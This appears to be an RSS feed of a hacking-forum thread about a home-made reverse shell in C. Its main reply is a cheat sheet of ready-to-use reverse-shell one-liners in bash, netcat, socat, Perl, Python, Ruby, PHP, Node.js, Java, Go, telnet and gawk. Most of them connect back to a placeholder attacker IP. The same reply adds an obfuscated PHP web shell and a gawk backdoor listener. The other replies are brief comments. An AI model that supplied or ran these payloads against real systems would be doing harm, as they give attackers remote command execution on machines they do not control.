<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Open Source Reverse Shell</title>
    <link>https://0x00sec.org/t/open-source-reverse-shell/3271</link>
    <description>Ok, so I&#39;ve coded a very basic reverse shell that I&#39;ve now decided to allow any member  to access and view the code, but before I post the code I gotta thank @0x00pf for his awesome [tutorial](https://0x00sec.org/t/remote-shells-part-i/269) and @Joe_Schmoe for  [STELF](https://gitlab.s-3.tech/JSchmoe/unnamed-shell) which inspired me to code this shell. I&#39;m trying to add functionality to my shell, but I&#39;m a 1337 Skid haxor. I&#39;m still learning but thanks to this community and their patience especially @_py and of course @pry0cc plus many others which helped me and answered my really really really dull questions. I&#39;ve learned a lot coding this shell especially how file descriptors and sockets work. Thank you all that have helped me out quite a bit! 

Now the [code](https://gitlab.s-3.tech/v02alentine/reverse_shell) is written in C and I&#39;ve added comments to any that are interested in how it all works. To compile simply do,
``
gcc reverse_shell.c -o reverse_shell
``

and for the handler same thing,
``
gcc handler.c -o handler
``

The file named shell.c is actually a bind shell which I accidentally coded and just shows how stupid I can be, but I&#39;ve decided to keep it just in case I and anyone else finds it useful. I hope this becomes useful for anyone that is interested. If anyone wants to help with the development of the shell please request access. Thank you!

Cheers!</description>
    
    <lastBuildDate>Wed, 27 Apr 2022 08:28:12 +0000</lastBuildDate>
    <category>Linux</category>
    <atom:link href="https://0x00sec.org/t/open-source-reverse-shell/3271.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Open Source Reverse Shell</title>
        <dc:creator><![CDATA[C_J]]></dc:creator>
        <description><![CDATA[
            <p>Here is what I found:</p>
<h2>
<a name="bash-reverse-shells-1" class="anchor" href="https://0x00sec.org#bash-reverse-shells-1"></a>Bash Reverse Shells</h2>
<pre><code class="lang-auto">exec /bin/bash 0&amp;0 2&gt;&amp;0
</code></pre>
<pre><code class="lang-auto">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
</code></pre>
<pre><code class="lang-auto">exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80
cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done  

# or:

while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
</code></pre>
<pre><code class="lang-auto">bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1
</code></pre>
<h2>
<a name="socat-reverse-shell-2" class="anchor" href="https://0x00sec.org#socat-reverse-shell-2"></a>socat Reverse Shell</h2>
<p>Source: <span class="mention">@filip_dragovic</span></p>
<pre><code class="lang-auto">socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &amp;
</code></pre>
<h2>
<a name="golang-reverse-shell-3" class="anchor" href="https://0x00sec.org#golang-reverse-shell-3"></a>Golang Reverse Shell</h2>
<pre><code class="lang-auto">echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'&gt;/tmp/sh.go&amp;&amp;go run /tmp/sh.go
</code></pre>
<h2>
<a name="php-reverse-shell-4" class="anchor" href="https://0x00sec.org#php-reverse-shell-4"></a>PHP Reverse Shell</h2>
<p>A useful PHP reverse shell:</p>
<pre><code class="lang-auto">php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
</code></pre>
<p>Another PHP reverse shell (that was submitted via Twitter):</p>
<pre><code class="lang-auto">&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/"ATTACKING IP"/443 0&gt;&amp;1'");?&gt;
</code></pre>
<p>Base64 encoded by <span class="mention">@0xInfection</span>:</p>
<pre><code class="lang-auto">&lt;?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
</code></pre>
<h2>
<a name="netcat-reverse-shell-5" class="anchor" href="https://0x00sec.org#netcat-reverse-shell-5"></a>Netcat Reverse Shell</h2>
<p>Useful netcat reverse shell examples:</p>
<p>Don’t forget to start your listener, or you won’t be catching any shells <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<pre><code class="lang-auto">nc -lnvp 80
</code></pre>
<pre><code class="lang-auto">nc -e /bin/sh ATTACKING-IP 80
</code></pre>
<pre><code class="lang-auto">/bin/sh | nc ATTACKING-IP 80
</code></pre>
<pre><code class="lang-auto">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p
</code></pre>
<p>A reverse shell submitted by <a href="https://twitter.com/atul_hax" rel="noopener nofollow ugc">@0xatul</a> which works well for OpenBSD netcat rather than GNU nc:</p>
<pre><code class="lang-auto">mkfifo /tmp/lol;nc ATTACKER-IP PORT 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre>
<h2>
<a name="nodejs-reverse-shell-6" class="anchor" href="https://0x00sec.org#nodejs-reverse-shell-6"></a>Node.js Reverse Shell</h2>
<pre><code class="lang-auto">require('child_process').exec('bash -i &gt;&amp; /dev/tcp/10.0.0.1/80 0&gt;&amp;1');
</code></pre>
<p>Source: <span class="mention">@jobertabma</span> via <span class="mention">@JaneScott</span></p>
<h2>
<a name="telnet-reverse-shell-7" class="anchor" href="https://0x00sec.org#telnet-reverse-shell-7"></a>Telnet Reverse Shell</h2>
<pre><code class="lang-auto">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
</code></pre>
<pre><code class="lang-auto">telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
</code></pre>
<p>Remember to listen on 443 on the attacking machine also.</p>
<h2>
<a name="perl-reverse-shell-8" class="anchor" href="https://0x00sec.org#perl-reverse-shell-8"></a>Perl Reverse Shell</h2>
<pre><code class="lang-auto">perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre>
<h3>
<a name="perl-windows-reverse-shell-9" class="anchor" href="https://0x00sec.org#perl-windows-reverse-shell-9"></a>Perl Windows Reverse Shell</h3>
<pre><code class="lang-auto">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre>
<pre><code class="lang-auto">perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre>
<h2>
<a name="ruby-reverse-shell-10" class="anchor" href="https://0x00sec.org#ruby-reverse-shell-10"></a>Ruby Reverse Shell</h2>
<pre><code class="lang-auto">ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
</code></pre>
<h2>
<a name="java-reverse-shell-11" class="anchor" href="https://0x00sec.org#java-reverse-shell-11"></a>Java Reverse Shell</h2>
<pre><code class="lang-auto">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
</code></pre>
<h2>
<a name="python-reverse-shell-12" class="anchor" href="https://0x00sec.org#python-reverse-shell-12"></a>Python Reverse Shell</h2>
<pre><code class="lang-auto">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre>
<h2>
<a name="gawk-reverse-shell-13" class="anchor" href="https://0x00sec.org#gawk-reverse-shell-13"></a>Gawk Reverse Shell</h2>
<p>Gawk one liner rev shell by <span class="mention">@dmfroberson</span>:</p>
<pre><code class="lang-auto">gawk 'BEGIN {P=4444;S="&gt; ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&amp;V;V|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&amp;V;close(c)}}while(c!="exit")close(V)}}'
</code></pre>
<pre><code class="lang-auto">#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd&gt; "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |&amp; Service
                        Service |&amp; getline cmd
                        if (cmd) {
                                while ((cmd |&amp; getline) &gt; 0)
                                        print $0 |&amp; Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
</code></pre>
<p>I hope you found this interesting!</p>
          <p><a href="https://0x00sec.org/t/open-source-reverse-shell/3271/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-source-reverse-shell/3271/6</link>
        <pubDate>Tue, 29 Mar 2022 23:03:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3271-6</guid>
        <source url="https://0x00sec.org/t/open-source-reverse-shell/3271.rss">Open Source Reverse Shell</source>
      </item>
      <item>
        <title>Open Source Reverse Shell</title>
        <dc:creator><![CDATA[hkh4cks]]></dc:creator>
        <description><![CDATA[
            <p>Awesome Stuff!! Thanks for sharing <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/open-source-reverse-shell/3271/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-source-reverse-shell/3271/5</link>
        <pubDate>Fri, 11 Aug 2017 14:26:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3271-5</guid>
        <source url="https://0x00sec.org/t/open-source-reverse-shell/3271.rss">Open Source Reverse Shell</source>
      </item>
      <item>
        <title>Open Source Reverse Shell</title>
        <dc:creator><![CDATA[operatorequals]]></dc:creator>
        <description><![CDATA[
            <p>Oh man! If you like those concepts the reverse DNS and ICMP shells will get you wet…</p>
          <p><a href="https://0x00sec.org/t/open-source-reverse-shell/3271/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-source-reverse-shell/3271/4</link>
        <pubDate>Thu, 10 Aug 2017 15:40:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3271-4</guid>
        <source url="https://0x00sec.org/t/open-source-reverse-shell/3271.rss">Open Source Reverse Shell</source>
      </item>
      <item>
        <title>Open Source Reverse Shell</title>
        <dc:creator><![CDATA[Red_Joker]]></dc:creator>
        <description><![CDATA[
            <p>Reverse Shell is more reliable than a bind shell because of Firewalls. Most Firewalls will actually not allow you to bind to the port that a bind shell needs which is why reverse shell are ideal because of the fact that they “call home”.</p>
          <p><a href="https://0x00sec.org/t/open-source-reverse-shell/3271/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-source-reverse-shell/3271/3</link>
        <pubDate>Thu, 10 Aug 2017 15:39:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3271-3</guid>
        <source url="https://0x00sec.org/t/open-source-reverse-shell/3271.rss">Open Source Reverse Shell</source>
      </item>
      <item>
        <title>Open Source Reverse Shell</title>
        <dc:creator><![CDATA[operatorequals]]></dc:creator>
        <description><![CDATA[
            <p>Are we all <code>reverse shell</code>ing in this place?</p>
          <p><a href="https://0x00sec.org/t/open-source-reverse-shell/3271/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-source-reverse-shell/3271/2</link>
        <pubDate>Thu, 10 Aug 2017 15:37:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3271-2</guid>
        <source url="https://0x00sec.org/t/open-source-reverse-shell/3271.rss">Open Source Reverse Shell</source>
      </item>
      <item>
        <title>Open Source Reverse Shell</title>
        <dc:creator><![CDATA[Red_Joker]]></dc:creator>
        <description><![CDATA[
            <p>Ok, so I’ve coded a very basic reverse shell that I’ve now decided to allow any member  to access and view the code, but before I post the code I gotta thank <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> for his awesome <a href="https://0x00sec.org/t/remote-shells-part-i/269">tutorial</a> and <a class="mention" href="https://0x00sec.org/u/joe_schmoe">@Joe_Schmoe</a> for  <a href="https://gitlab.s-3.tech/JSchmoe/unnamed-shell" rel="nofollow noopener">STELF</a> which inspired me to code this shell. I’m trying to add functionality to my shell, but I’m a 1337 Skid haxor. I’m still learning but thanks to this community and their patience especially <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> and of course <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> plus many others which helped me and answered my really really really dull questions. I’ve learned a lot coding this shell especially how file descriptors and sockets work. Thank you all that have helped me out quite a bit!</p>
<p>Now the <a href="https://gitlab.s-3.tech/v02alentine/reverse_shell" rel="nofollow noopener">code</a> is written in C and I’ve added comments to any that are interested in how it all works. To compile simply do,<br>
<code>gcc reverse_shell.c -o reverse_shell</code></p>
<p>and for the handler same thing,<br>
<code>gcc handler.c -o handler</code></p>
<p>The file named shell.c is actually a bind shell which I accidentally coded and just shows how stupid I can be, but I’ve decided to keep it just in case I and anyone else finds it useful. I hope this becomes useful for anyone that is interested. If anyone wants to help with the development of the shell please request access. Thank you!</p>
<p>Cheers!</p>
          <p><a href="https://0x00sec.org/t/open-source-reverse-shell/3271/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/open-source-reverse-shell/3271/1</link>
        <pubDate>Thu, 10 Aug 2017 14:51:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3271-1</guid>
        <source url="https://0x00sec.org/t/open-source-reverse-shell/3271.rss">Open Source Reverse Shell</source>
      </item>
  </channel>
</rss>
